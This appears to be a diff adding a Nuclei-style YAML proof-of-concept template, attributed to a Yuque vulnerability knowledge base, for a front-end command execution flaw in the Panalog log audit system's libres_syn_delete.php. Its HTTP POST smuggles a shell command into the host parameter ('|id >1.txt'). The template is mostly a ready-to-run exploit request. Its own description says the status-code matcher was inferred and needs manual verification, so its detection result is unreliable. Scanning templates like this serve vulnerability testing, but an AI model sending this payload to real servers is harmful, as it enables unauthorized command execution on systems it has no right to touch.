@@ -1,0 +1,33 @@
+id: poc-ltg8rbhmy9wla1gc
+info:
+  name: Panalog日志审计系统libres_syn_delete.php前台存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ltg8rbhmy9wla1gc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ltg8rbhmy9wla1gc
+http:
+- raw:
+  - 'POST /content-apply/libres_syn_delete.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+
+    token=1&id=2&host=|id >1.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
